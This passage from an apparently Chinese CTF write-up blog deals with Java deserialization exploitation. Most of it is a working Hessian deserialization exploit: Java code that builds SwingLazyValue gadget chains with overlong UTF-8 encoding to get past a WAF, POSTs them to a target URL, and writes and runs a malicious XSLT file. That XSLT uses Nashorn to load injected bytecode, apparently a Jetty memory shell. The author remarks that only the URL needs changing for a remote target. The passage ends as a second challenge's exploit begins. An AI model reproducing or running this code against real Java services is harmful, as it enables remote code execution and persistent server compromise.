&#x27;java&#x27; waf  </span><br>        <span class="hljs-type">byte</span>[] evilXSLT = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(templateBytes)  <br>                        .replace(<span class="hljs-string">&quot;&lt;payload&gt;&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encoder.encode(evilBytes)))  <br>                        .getBytes();  <br>  <br>        <span class="hljs-comment">// define SwingLazyValue payload to send  </span><br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">writeFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(  <br>                <span class="hljs-string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>,  <br>                <span class="hljs-string">&quot;writeBytesToFilename&quot;</span>,  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>                        evilPath,<br>                        evilXSLT<br>                &#125;<br>        );<br>  <br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">execute</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(<br>                MethodUtil.class.getName(),<br>                <span class="hljs-string">&quot;whatever&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>                        MethodUtil.class.getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class),  <br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(),  <br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;  <br>                                Runtime.class.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String[].class),  <br>                                Runtime.getRuntime(),  <br>                                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;  <br>                                                isLinux ? <span class="hljs-string">&quot;sh&quot;</span> : <span class="hljs-string">&quot;cmd&quot;</span>,  <br>                                                isLinux ? <span class="hljs-string">&quot;-c&quot;</span> : <span class="hljs-string">&quot;/c&quot;</span>,  <br>                                                <span class="hljs-string">&quot;whatever&quot;</span><br>                                        &#125;  <br>                                &#125;  <br>                        &#125;  <br>                &#125;  <br>        );  <br>  <br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">runXSLT</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SwingLazyValue</span>(  <br>                <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>,  <br>                <span class="hljs-string">&quot;_main&quot;</span>,  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;-XT&quot;</span>, <span class="hljs-string">&quot;-XSL&quot;</span>, evilPath&#125;&#125;  <br>        );  <br>  <br>  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> makePayload(writeFile);<br><span class="hljs-comment">//        Object o2 = makePayload(execute);</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o3</span> <span class="hljs-operator">=</span> makePayload(runXSLT);<br>  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload1</span> <span class="hljs-operator">=</span> convertPayload(o1);<br><span class="hljs-comment">//        String payload2 = convertPayload(o2);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload3</span> <span class="hljs-operator">=</span> convertPayload(o3);<br>  <br><span class="hljs-comment">//        testObject(payload2);</span><br>  <br>        System.out.println(sendPost(targetURL, <span class="hljs-string">&quot;ser&quot;</span>, payload1));  <br><span class="hljs-comment">//        System.out.println(sendPost(targetURL, &quot;ser&quot;, payload2));  </span><br>        System.out.println(sendPost(targetURL, <span class="hljs-string">&quot;ser&quot;</span>, payload3));  <br>        System.out.println(sendPost(targetURL, <span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;ls&quot;</span>));  <br>  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">convertPayload</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2OutputWithOverlongEncoding</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutputWithOverlongEncoding</span>(baos);<br>        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);  <br>  <br>        hessian2Output.writeObject(o);  <br>        hessian2Output.flush();  <br>        <span class="hljs-type">byte</span>[] bytes = baos.toByteArray();  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(encoder.encode(bytes));  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testObject</span><span class="hljs-params">(String payload)</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BASE64Decoder</span>().decodeBuffer(payload);  <br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);  <br>            <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(bais);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hessian2Input.readObject();  <br>            System.out.println(o);  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            e.printStackTrace();  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makePayload</span><span class="hljs-params">(SwingLazyValue swingLazyValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">uiDefaults</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();  <br>        uiDefaults.put(<span class="hljs-string">&quot;test&quot;</span>, swingLazyValue);  <br>  <br>        <span class="hljs-type">MimeTypeParameterList</span> <span class="hljs-variable">mimeTypeParameterList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MimeTypeParameterList</span>();  <br>        setFieldValue(mimeTypeParameterList, <span class="hljs-string">&quot;parameters&quot;</span>, uiDefaults);  <br>  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">typeConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.sound.sampled.AudioFileFormat$Type&quot;</span>).getConstructor(String.class, String.class);  <br>        typeConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> typeConstructor.newInstance(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>        setFieldValue(type, <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-literal">null</span>);  <br>  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry1</span> <span class="hljs-operator">=</span> newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">rdnEntry2</span> <span class="hljs-operator">=</span> newInstance(<span class="hljs-string">&quot;javax.naming.ldap.Rdn$RdnEntry&quot;</span>, <span class="hljs-literal">null</span>);  <br>        setFieldValue(rdnEntry1, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>        setFieldValue(rdnEntry1, <span class="hljs-string">&quot;value&quot;</span>, mimeTypeParameterList);  <br>        setFieldValue(rdnEntry2, <span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>        setFieldValue(rdnEntry2, <span class="hljs-string">&quot;value&quot;</span>, type);  <br>  <br>        <span class="hljs-comment">// make mimeTypeParameterList before Type  </span><br>        <span class="hljs-type">TreeSet</span> <span class="hljs-variable">treeSet</span> <span class="hljs-operator">=</span> makeTreeSet(rdnEntry1, rdnEntry2);  <br>        <span class="hljs-keyword">return</span> treeSet;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);  <br>            <span class="hljs-keyword">if</span> (field != <span class="hljs-literal">null</span>)  <br>                field.setAccessible(<span class="hljs-literal">true</span>);  <br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)  <br>                field = getField(clazz.getSuperclass(), fieldName);  <br>            <span class="hljs-keyword">return</span> field;  <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;  <br>            <span class="hljs-keyword">if</span> (!clazz.getSuperclass().equals(Object.class)) &#123;  <br>                <span class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);  <br>            &#125;  <br>            <span class="hljs-keyword">throw</span> e;  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newInstance</span><span class="hljs-params">(String className, Object... args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Class&lt;?&gt; clazz = Class.forName(className);  <br>        <span class="hljs-keyword">if</span> (args != <span class="hljs-literal">null</span>) &#123;  <br>            Class&lt;?&gt;[] argTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[args.length];  <br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;  <br>                argTypes[i] = args[i].getClass();  <br>            &#125;  <br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(argTypes);  <br>            constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>            <span class="hljs-keyword">return</span> constructor.newInstance(args);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();  <br>            constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>            <span class="hljs-keyword">return</span> constructor.newInstance();  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TreeSet <span class="hljs-title function_">makeTreeSet</span><span class="hljs-params">(Object o1, Object o2)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">TreeMap</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>();  <br>        setFieldValue(m, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);  <br>        setFieldValue(m, <span class="hljs-string">&quot;modCount&quot;</span>, <span class="hljs-number">2</span>);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">nodeC</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.TreeMap$Entry&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCst</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);  <br>        nodeCst.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> nodeCst.newInstance(o1, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> nodeCst.newInstance(o2, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>], node);  <br>        setFieldValue(node, <span class="hljs-string">&quot;right&quot;</span>, right);  <br>        setFieldValue(m, <span class="hljs-string">&quot;root&quot;</span>, node);  <br>        <span class="hljs-type">TreeSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeSet</span>();  <br>        setFieldValue(set, <span class="hljs-string">&quot;m&quot;</span>, m);  <br>        <span class="hljs-keyword">return</span> set;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">joinPath</span><span class="hljs-params">(String... paths)</span> &#123;  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">finalPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  <br>        <span class="hljs-keyword">for</span> (String path : paths) &#123;  <br>            <span class="hljs-keyword">if</span> (isLinux) &#123;  <br>                finalPath.append(<span class="hljs-string">&quot;/&quot;</span>).append(path);  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                finalPath.append(<span class="hljs-string">&quot;\\&quot;</span>).append(path);  <br>            &#125;  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> finalPath.toString();  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sendPost</span><span class="hljs-params">(String urlStr, String paramName, String paramValue)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(urlStr);  <br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();  <br>  <br>        connection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);  <br>        connection.setDoOutput(<span class="hljs-literal">true</span>);  <br>  <br>        connection.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);  <br>  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">urlParameters</span> <span class="hljs-operator">=</span> paramName + <span class="hljs-string">&quot;=&quot;</span> + URLEncoder.encode(paramValue, <span class="hljs-string">&quot;UTF-8&quot;</span>);  <br>  <br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(connection.getOutputStream())) &#123;  <br>            out.writeBytes(urlParameters);  <br>            out.flush();  <br>        &#125;  <br>  <br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();  <br>  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();  <br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(connection.getInputStream()))) &#123;  <br>            String inputLine;  <br>            <span class="hljs-keyword">while</span> ((inputLine = in.readLine()) != <span class="hljs-literal">null</span>) &#123;  <br>                response.append(inputLine);  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode + <span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;Response: &quot;</span> + response;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- template.xslt 这里的java 使用了html实体编码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>  </span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:sem</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/ja<span class="hljs-symbol">&amp;#x76;</span>a/ja<span class="hljs-symbol">&amp;#x76;</span>ax.script.ScriptEngineManager&quot;</span>                <span class="hljs-attr">xmlns:se</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/ja<span class="hljs-symbol">&amp;#x76;</span>a/ja<span class="hljs-symbol">&amp;#x76;</span>ax.script.ScriptEngine&quot;</span>&gt;</span>  <br>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;unsafeClass&quot; select=&quot;ja&amp;#x76;a:ja&amp;#x76;a.lang.Class.forName(&#x27;sun.misc.Unsafe&#x27;)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;theUnsafeField&quot; select=&quot;cl:getDeclaredField($unsafeClass, &#x27;theUnsafe&#x27;)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:&amp;#x76;alue-of select=&quot;filed:setAccessible($theUnsafeField, true())&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;unsafeInstance&quot; select=&quot;filed:get($theUnsafeField, $unsafeClass)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;test&quot; select=&quot;unsafe:staticFieldBase($unsafeInstance,$unsafeClass)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:variable name=&quot;rce&quot; select=&quot;unsafe:defineClass($unsafeInstance,&#x27;JettyMemoryShell&#x27;,$bs,0,ja&amp;#x76;a:ja&amp;#x76;a.lang.Integer.&amp;#x76;alueOf(ja&amp;#x76;a:ja&amp;#x76;a.lang.reflect.Array.getLength($bs)),$cl,null)&quot;/&gt;--&gt;</span>  <br><span class="hljs-comment">&lt;!--        &lt;xsl:&amp;#x76;alue-of select=&quot;$rce&quot;/&gt;--&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;engineobject&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;sem:new()&quot;</span>/&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;jsobject&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;sem:getEngineByName($engineobject,&#x27;nashorn&#x27;)&quot;</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;out&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;se:e<span class="hljs-symbol">&amp;#x76;</span>al($jsobject,&#x27;var thread = ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.Thread.currentThread();var classLoader = thread.getContextClassLoader();ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.System.out.println(classLoader);try&#123;classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>org.apache.commons.qx.SOAPUtils<span class="hljs-symbol">&amp;quot;</span>).newInstance();&#125;catch (e)&#123;var clsString = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.String<span class="hljs-symbol">&amp;quot;</span>);var bytecodeBase64 = <span class="hljs-symbol">&amp;quot;</span>&lt;payload&gt;<span class="hljs-symbol">&amp;quot;</span>;var bytecode;try&#123;var clsBase64 = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.util.Base64<span class="hljs-symbol">&amp;quot;</span>);var clsDecoder = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.util.Base64$Decoder<span class="hljs-symbol">&amp;quot;</span>);bytecode = ja<span class="hljs-symbol">&amp;#x76;</span>a.util.Base64.getDecoder().decode(bytecodeBase64);&#125; catch (ee) &#123;try &#123;var datatypeCon<span class="hljs-symbol">&amp;#x76;</span>erterClz = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>ax.xml.bind.DatatypeCon<span class="hljs-symbol">&amp;#x76;</span>erter<span class="hljs-symbol">&amp;quot;</span>);bytecode = datatypeCon<span class="hljs-symbol">&amp;#x76;</span>erterClz.getMethod(<span class="hljs-symbol">&amp;quot;</span>parseBase64Binary<span class="hljs-symbol">&amp;quot;</span>, clsString).in<span class="hljs-symbol">&amp;#x76;</span>oke(datatypeCon<span class="hljs-symbol">&amp;#x76;</span>erterClz, bytecodeBase64);&#125; catch (eee) &#123;var clazz1 = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>sun.misc.BASE64Decoder<span class="hljs-symbol">&amp;quot;</span>);bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);&#125;&#125;var clsClassLoader = classLoader.loadClass(<span class="hljs-symbol">&amp;quot;</span>ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.ClassLoader<span class="hljs-symbol">&amp;quot;</span>);var clsByteArray = (new ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.String(<span class="hljs-symbol">&amp;quot;</span>a<span class="hljs-symbol">&amp;quot;</span>).getBytes().getClass());var clsInt = ja<span class="hljs-symbol">&amp;#x76;</span>a.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(<span class="hljs-symbol">&amp;quot;</span>defineClass<span class="hljs-symbol">&amp;quot;</span>, [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.in<span class="hljs-symbol">&amp;#x76;</span>oke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();&#125;&#x27;)&quot;</span>/&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:value-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;$out&quot;</span>/&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520181531620.png" alt="image-20250520181531620"></p><p>可以看到已经将恶意字节码和xslt写进去了：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250520181934973.png" alt="image-20250520181934973"></p><p>远程改个url就行了。</p><p>参考链接：</p><p><a href="https://github.com/XDSEC/miniLCTF_2025/blob/main/OfficialWriteups/Web/ezHessian-hdHessian.md">miniLCTF_2025&#x2F;OfficialWriteups&#x2F;Web&#x2F;ezHessian-hdHessian.md at main · XDSEC&#x2F;miniLCTF_2025</a></p><p><a href="https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/">记某次实战hessian不出网反序列化利用 | huahua’s Blog</a></p><p><a href="https://exp10it.io/2024/02/hessian-utf-8-overlong-encoding/">Hessian UTF-8 Overlong Encoding - X1r0z Blog</a></p><p><a href="https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html">探寻Hessian JDK原生反序列化不出网的任意代码执行利用链 – Whwlsfb’s Tech Blog</a></p><p><a href="https://www.freebuf.com/articles/web/424308.html">Hessian反序列化原理到武器化利用 - FreeBuf网络安全行业门户</a></p><p>[内存马系列 Jetty型内存马学习 - Boogiepop Doesn’t Laugh](<a href="https://boogipop.com/2023/10/01/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97">https://boogipop.com/2023/10/01/内存马系列</a> Jetty型内存马学习&#x2F;)</p><p><a href="https://xz.aliyun.com/news/14578">从0到1学会Jetty内存马注入-先知社区</a></p><h2 id="DASCTF2025上半年-再短一点点"><a href="#DASCTF2025上半年-再短一点点" class="headerlink" title="DASCTF2025上半年-再短一点点"></a>DASCTF2025上半年-再短一点点</h2><p>只给了h2和spring的依赖，反序列化有长度限制，开始以为这里是最终sink，需要找gadget触发到getConnection()，但是没想到题目就是硬压的。。。。</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250708151505554.png" alt="image-20250708151505554"></p><p>思路就是利用Jackson链的不稳定性（不使用动态代理）去压缩，循环遍历到符合长度条件的base64-payload，最后payload删掉两个字符不影响最后的跑通。</p><p>resolveClass的黑名单ban了TemplatesImpl、BadAttributeValueExpException这种，可以直接用SignedObject打二次反序列化绕了。</p><p>还要注意题目用的反序列化是InflaterInputStream，所以我们序列化也需要用对应的DeflaterOutputStream进行处理序列化数据。</p><p>题目意思就是删掉&#x2F;a文件就可以回显出flag了：</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250708151606781.png" alt="image-20250708151606781"></p><h3 id="EXP-8"><a href="#EXP-8" class="headerlink" title="EXP"></a>EXP</h3><p>思路就这么个思路，直接用官方的了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 